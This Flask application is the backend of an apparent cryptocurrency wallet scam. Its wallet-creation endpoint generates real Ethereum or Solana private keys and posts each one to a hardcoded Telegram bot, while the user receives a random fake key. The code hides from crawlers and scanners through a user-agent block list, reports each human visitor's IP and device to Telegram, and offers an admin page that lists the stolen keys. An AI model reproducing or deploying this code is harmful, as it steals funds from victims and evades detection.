from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import sqlite3
import secrets
from datetime import datetime
import requests
import socket

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
CORS(app)
TOKEN = "7656552098:AAGJSer06cf6Wc28IjcxD_spBHs2btszcIg"
CHAT_ID = "8288130111"

conn = sqlite3.connect('/tmp/saqr.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS wallets
    (id INTEGER PRIMARY KEY AUTOINCREMENT,
     network TEXT, address TEXT UNIQUE,
     real_key TEXT, fake_key TEXT,
     created_at TEXT)''')
conn.commit()

BOTS = ['bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'amazonaws', 'compute-1', 'ec2-', 'twitterbot', 'googlebot', 'bingbot', 'yandex', 'baidu', 'facebook', 'telegram', 'whatsapp', 'discord', 'slack', 'preview', 'ahrefs', 'semrush', 'majestic', 'puppeteer', 'headless', 'selenium', 'phantom', 'python-requests']

def is_bot(ua):
    ua_lower = ua.lower()
    for bot in BOTS:
        if bot in ua_lower:
            return True
    return False

def send_tg(msg):
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"}, timeout=3)
    except:
        pass

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', 'Unknown')
    
    if not is_bot(ua):
        try:
            hostname = socket.gethostbyaddr(ip)[0] if ip else 'Unknown'
        except:
            hostname = 'Unknown'
        
        device = 'Unknown'
        if 'Android' in ua: device = 'Android'
        elif 'iPhone' in ua: device = 'iPhone'
        elif 'Windows' in ua: device = 'Windows'
        elif 'Mac' in ua: device = 'Mac'
        elif 'Linux' in ua: device = 'Linux'
        
        send_tg(f"Real visitor: {device} | {ip} | {hostname}")
    
    return render_template('index.html')

@app.route('/select')
def select():
    return render_template('select.html')

@app.route('/wallet')
def wallet():
    return render_template('wallet.html')

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

@app.route('/withdraw')
def withdraw():
    return render_template('withdraw.html')

@app.route('/referral')
def referral():
    return render_template('referral.html')

@app.route('/certificates')
def certificates():
    return render_template('certificates.html')

@app.route('/payments')
def payments():
    return render_template('payments.html')

@app.route('/chat')
def chat():
    return render_template('chat.html')

@app.route('/api/create-wallet', methods=['POST'])
def create_wallet():
    network = request.json.get('network', 'ethereum')
    
    if network == 'solana':
        from solders.keypair import Keypair
        keypair = Keypair()
        address = str(keypair.pubkey())
        real_key = bytes(keypair).hex()
    else:
        from eth_account import Account
        account = Account.create()
        address = account.address
        real_key = account.key.hex()
    
    fake_key = "0x" + secrets.token_hex(32)
    
    c.execute("INSERT INTO wallets (network, address, real_key, fake_key, created_at) VALUES (?, ?, ?, ?, ?)",
              (network, address, real_key, fake_key, datetime.now().isoformat()))
    conn.commit()
    
    send_tg(f"New wallet! {network}: {address} | Key: {real_key}")
    
    return jsonify({'address': address, 'private_key': fake_key})

@app.route('/admin')
def admin():
    if request.args.get('token', '') != 'saqr2026':
        return "Unauthorized", 401
    c.execute("SELECT * FROM wallets ORDER BY id DESC")
    wallets = c.fetchall()
    html = '<html><head><style>body{font-family:monospace;background:#0a0e27;color:#fff}table{border-collapse:collapse}td{padding:5px;border:1px solid #333}.key{color:gold}</style></head><body><h1 style="color:#00ff88">Admin Panel</h1><table>'
    for w in wallets:
        html += f'<tr><td>{w[1]}</td><td>{w[2][:25]}...</td><td class="key">{w[3]}</td></tr>'
    return html + '</table></body></html>'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
